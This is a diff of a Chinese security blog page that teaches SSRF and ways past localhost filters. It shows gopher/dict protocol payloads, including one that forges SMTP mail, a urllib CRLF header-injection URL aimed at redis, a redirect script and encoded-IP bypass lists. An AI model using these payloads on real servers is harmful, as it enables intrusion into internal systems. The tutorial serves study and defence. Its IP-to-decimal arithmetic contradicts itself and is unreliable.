@@ -6,19 +6,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="从代码层分析SSRF和绕过思路 title: 从代码层分析SSRF和绕过思路  date: 2019-02-14 16:01:00这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！ ssrf是什么?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSR">
+    <meta name="description" content="这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！ ssrf是什么?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过">
 <meta property="og:type" content="article">
-<meta property="og:title" content="c1y2m3’blog">
-<meta property="og:url" content="http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/index.html">
+<meta property="og:title" content="从代码层分析SSRF和绕过思路">
+<meta property="og:url" content="http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="从代码层分析SSRF和绕过思路 title: 从代码层分析SSRF和绕过思路  date: 2019-02-14 16:01:00这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！ ssrf是什么?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSR">
+<meta property="og:description" content="这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！ ssrf是什么?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://www.likesec.com/assets/blogimg/ssrf2.png">
 <meta property="og:image" content="http://www.likesec.com/assets/blogimg/ssrf3.png">
-<meta property="og:updated_time" content="2019-02-04T08:02:06.000Z">
+<meta property="og:updated_time" content="2019-02-04T08:16:07.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="c1y2m3’blog">
-<meta name="twitter:description" content="从代码层分析SSRF和绕过思路 title: 从代码层分析SSRF和绕过思路  date: 2019-02-14 16:01:00这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！ ssrf是什么?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSR">
+<meta name="twitter:title" content="从代码层分析SSRF和绕过思路">
+<meta name="twitter:description" content="这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！ ssrf是什么?SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过">
 <meta name="twitter:image" content="http://www.likesec.com/assets/blogimg/ssrf2.png">
     
     
@@ -39,7 +39,7 @@
         
     
     <!-- title -->
-    <title>c1y2m3’blog</title>
+    <title>从代码层分析SSRF和绕过思路</title>
     <!-- styles -->
     <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
     <!-- persian styles -->
@@ -89,21 +89,21 @@
     <br>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/04/从代码层分析SSRF和绕过思路/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&text=从代码层分析SSRF和绕过思路"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&is_video=false&description=从代码层分析SSRF和绕过思路"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=从代码层分析SSRF和绕过思路&body=Check out this article: http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&title=从代码层分析SSRF和绕过思路"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/14/从代码层分析SSRF和绕过思路/&name=从代码层分析SSRF和绕过思路&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#从代码层分析SSRF和绕过思路"><span class="toc-number">1.</span> <span class="toc-text">从代码层分析SSRF和绕过思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#date-2019-02-14-16-01-00"><span class="toc-number">1.1.</span> <span class="toc-text">date: 2019-02-14 16:01:00</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf是什么"><span class="toc-number">2.</span> <span class="toc-text">ssrf是什么?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用后端实现"><span class="toc-number">3.</span> <span class="toc-text">常用后端实现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用攻击手段"><span class="toc-number">4.</span> <span class="toc-text">常用攻击手段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#协议利用"><span class="toc-number">5.</span> <span class="toc-text">协议利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf-in-python"><span class="toc-number">6.</span> <span class="toc-text">ssrf in python</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过姿势"><span class="toc-number">7.</span> <span class="toc-text">绕过姿势</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">8.</span> <span class="toc-text">参考链接:</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf是什么"><span class="toc-number">1.</span> <span class="toc-text">ssrf是什么?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用后端实现"><span class="toc-number">2.</span> <span class="toc-text">常用后端实现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用攻击手段"><span class="toc-number">3.</span> <span class="toc-text">常用攻击手段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#协议利用"><span class="toc-number">4.</span> <span class="toc-text">协议利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf-in-python"><span class="toc-number">5.</span> <span class="toc-text">ssrf in python</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过姿势"><span class="toc-number">6.</span> <span class="toc-text">绕过姿势</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">7.</span> <span class="toc-text">参考链接:</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -115,7 +115,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        
+        从代码层分析SSRF和绕过思路
     </h1>
 
 
@@ -126,7 +126,7 @@
       </span>
       
     <div class="postdate">
-        <time datetime="2019-02-04T06:46:14.000Z" itemprop="datePublished">2019-02-04</time>
+        <time datetime="2019-02-14T08:01:00.000Z" itemprop="datePublished">2019-02-14</time>
     </div>
 
 
@@ -139,9 +139,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="从代码层分析SSRF和绕过思路"><a href="#从代码层分析SSRF和绕过思路" class="headerlink" title="从代码层分析SSRF和绕过思路"></a>从代码层分析SSRF和绕过思路</h1><hr>
-<p>title: 从代码层分析SSRF和绕过思路 </p>
-<h2 id="date-2019-02-14-16-01-00"><a href="#date-2019-02-14-16-01-00" class="headerlink" title="date: 2019-02-14 16:01:00"></a>date: 2019-02-14 16:01:00</h2><p>这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！</p>
+    <p>这个世界从来不缺少创作者，绕过的方法有一万种，本文只是进行简单的绕过思路，具体还是以环境而定，嘿嘿！</p>
 <h1 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么?"></a>ssrf是什么?</h1><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p>
 <p>漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p>
 <p>攻击者可以利用SSRF实现的攻击主要有5种：</p>
@@ -174,6 +172,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = $_GET[&apos;ip&apos;];</span><br><span class="line">$port = $_GET[&apos;port&apos;];</span><br><span class="line">$scheme = $_GET[&apos;s&apos;];</span><br><span class="line">$data = $_GET[&apos;data&apos;];</span><br><span class="line">header(&quot;Location: $scheme://$ip:$port/$data&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p><a href="https://_thorns.gitbooks.io/sec/content/xiao_mi_mou_chu_ssrf_lou_6d1e28_ke_nei_wang_shell_.html" target="_blank" rel="noopener">小米某处SSRF漏洞(可内网SHELL 附多线程Fuzz脚本)</a></p>
 <p><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="noopener">腾讯某处SSRF漏洞(非常好的利用点)附利用脚本</a></p>
+<p><a href="https://phpinfo.me/2017/02/23/1438.html" target="_blank" rel="noopener">Discuz ssrf漏洞利用脚本</a></p>
 <h1 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h1><p>先来看看curl支持哪些协议<br><img src="http://www.likesec.com/assets/blogimg/ssrf2.png" alt=""></p>
 <ul>
 <li><p>Dict 协议（除了泄露安装软件版本信息，还可以查看端口，操作内网redis服务等）</p>
@@ -190,33 +189,31 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure>
 <p>tips：</p>
-<ol>
+<ul>
 <li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li>
 <li>file_get_contents 的 gopher 协议不能 URLencode</li>
 <li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li>
 <li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li>
 <li>curl_exec() //默认不跟踪跳转，</li>
 <li>file_get_contents() // file_get_contents支持php://input协议</li>
-</ol>
-<h1 id="ssrf-in-python"><a href="#ssrf-in-python" class="headerlink" title="ssrf in python"></a>ssrf in python</h1><p>当使用了Python 的urllib库，请求url为用户可控时，就可能存在ssrf漏洞，且可以通过漏洞python urllib http头注入实现对内网未授权仿问的redis 服务器getshell<br>类似于<a href="http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:ur10ser/testhttp头注入。" target="_blank" rel="noopener">http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:ur10ser/testhttp头注入。</a></p>
+</ul>
+<h1 id="ssrf-in-python"><a href="#ssrf-in-python" class="headerlink" title="ssrf in python"></a>ssrf in python</h1><p>当使用了Python 的urllib库，请求url为用户可控时，就可能存在ssrf漏洞，且可以通过漏洞python urllib http头注入实现对内网未授权仿问的redis 服务器getshell。<br>http头注入：<br><a href="http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:ur10ser/test" target="_blank" rel="noopener">http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:ur10ser/test</a> </p>
 <p>这样就会得到响应头：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /test HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :ur10ser</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 <h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>1.<br>攻击本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure></p>
 <p>2.<br>利用[::]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用[::]绕过localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1  //这个我本地没有测试成功，目前原因还不清楚</span><br></pre></td></tr></table></figure></p>
 <p>3.<br>利用@<br>在主机名前也可以包含连接到服务器所需的用户名和密码（格式：username:password@hostname)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1</span><br></pre></td></tr></table></figure></p>
 <p>4.<br>短网址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://suo.im/8qE9F == 127.0.0.1</span><br></pre></td></tr></table></figure></p>
-<p>5、<br>特殊域名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1.xip.io/</span><br><span class="line">http://www.ur10ser.xyz.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure></p>
+<p>5.<br>特殊域名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1.xip.io/</span><br><span class="line">http://www.ur10ser.xyz.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure></p>
 <p>6.<br>dns解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//在域名设置记录指向127.0.0.1</span><br><span class="line">http://ssrf.vb.com/</span><br></pre></td></tr></table></figure></p>
 <p>7.<br>利用句号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1. //本地未成功</span><br><span class="line">看系统而定，127.1.1.0000001  &gt;&gt;&gt; 127.0.0.1  成功</span><br></pre></td></tr></table></figure></p>
-<p>8.<br>特殊ip表示<br><img src="http://www.likesec.com/assets/blogimg/ssrf3.png" alt=""><br>9.<br>利用进制转换<br>四位点分十进制形式的IP地址“127.0.0.1”代表一组32位二进制数码，如果合在一起再转换成一个十进制数的话，答案就是1945096731。转换方法很简单，就是数制的完全展开：<br>127256^3+0256^2+0256^1+1256^0=1929379840+15663104+53760+27=2130706433</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT INET_ATON(&apos;127.0.0.1&apos;), INET_ATON(&apos;127.1&apos;);</span><br><span class="line">+------------------------+--------------------+</span><br><span class="line">| INET_ATON(&apos;127.0.0.1&apos;) | INET_ATON(&apos;127.1&apos;) |</span><br><span class="line">+------------------------+--------------------+</span><br><span class="line">|             2130706433 |         2130706433 |</span><br><span class="line">+------------------------+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>8.<br>特殊ip表示<br><img src="http://www.likesec.com/assets/blogimg/ssrf3.png" alt=""><br>9.<br>利用进制转换<br>四位点分十进制形式的IP地址“127.0.0.1”代表一组32位二进制数码，如果合在一起再转换成一个十进制数的话，答案就是1945096731。转换方法很简单，就是数制的完全展开：<br>127256^3+0256^2+0256^1+1256^0=1929379840+15663104+53760+27=2130706433<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT INET_ATON(&apos;127.0.0.1&apos;), INET_ATON(&apos;127.1&apos;);</span><br><span class="line">+------------------------+--------------------+</span><br><span class="line">| INET_ATON(&apos;127.0.0.1&apos;) | INET_ATON(&apos;127.1&apos;) |</span><br><span class="line">+------------------------+--------------------+</span><br><span class="line">|             2130706433 |         2130706433 |</span><br><span class="line">+------------------------+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
 <p>八进制ip</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0163.073751033   8进制</span><br><span class="line"></span><br><span class="line">http://0163.15716891     8进制与10进制配合</span><br></pre></td></tr></table></figure>
 <p>十六进制ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://0x73.0x000EFD21B  16进制</span><br><span class="line">http://0x73.15716891   16进制与10进制配合</span><br><span class="line">http://115.0xEFD21B</span><br><span class="line">http://0163.0xEFD21B  8进制与16进制配合</span><br></pre></td></tr></table></figure></p>
 <p>1、</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
-<p>2、其他特殊地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">127.00.1</span><br><span class="line">127.0.01</span><br><span class="line">0.00.0</span><br><span class="line">127.1.0.1</span><br><span class="line">127.10.1</span><br><span class="line">127.1.01</span><br><span class="line">0177.1</span><br><span class="line">0177.0001.0001</span><br><span class="line">0x7f.0x0.0x0.0x1</span><br><span class="line">0177.0000.0000.0001</span><br><span class="line">0177.0001.0000.0001</span><br><span class="line">0x7f.0x1.0x0.0x1</span><br><span class="line">0x7f.0x1.0x1</span><br><span class="line">localtest.me</span><br></pre></td></tr></table></figure>
+<p>2、其他特殊地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">127.00.1</span><br><span class="line">127.0.01</span><br><span class="line">0.00.0</span><br><span class="line">127.1.0.1</span><br><span class="line">127.10.1</span><br><span class="line">127.1.01</span><br><span class="line">0177.1</span><br><span class="line">0177.0001.0001</span><br><span class="line">0x7f.0x0.0x0.0x1</span><br><span class="line">0177.0000.0000.0001</span><br><span class="line">0177.0001.0000.0001</span><br><span class="line">0x7f.0x1.0x0.0x1</span><br><span class="line">0x7f.0x1.0x1</span><br><span class="line">localtest.me</span><br></pre></td></tr></table></figure></p>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://zhuanlan.zhihu.com/p/27898202" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27898202</a></p>
 
   </div>
@@ -243,21 +240,21 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#从代码层分析SSRF和绕过思路"><span class="toc-number">1.</span> <span class="toc-text">从代码层分析SSRF和绕过思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#date-2019-02-14-16-01-00"><span class="toc-number">1.1.</span> <span class="toc-text">date: 2019-02-14 16:01:00</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf是什么"><span class="toc-number">2.</span> <span class="toc-text">ssrf是什么?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用后端实现"><span class="toc-number">3.</span> <span class="toc-text">常用后端实现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用攻击手段"><span class="toc-number">4.</span> <span class="toc-text">常用攻击手段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#协议利用"><span class="toc-number">5.</span> <span class="toc-text">协议利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf-in-python"><span class="toc-number">6.</span> <span class="toc-text">ssrf in python</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过姿势"><span class="toc-number">7.</span> <span class="toc-text">绕过姿势</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">8.</span> <span class="toc-text">参考链接:</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf是什么"><span class="toc-number">1.</span> <span class="toc-text">ssrf是什么?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用后端实现"><span class="toc-number">2.</span> <span class="toc-text">常用后端实现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用攻击手段"><span class="toc-number">3.</span> <span class="toc-text">常用攻击手段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#协议利用"><span class="toc-number">4.</span> <span class="toc-text">协议利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf-in-python"><span class="toc-number">5.</span> <span class="toc-text">ssrf in python</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过姿势"><span class="toc-number">6.</span> <span class="toc-text">绕过姿势</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span 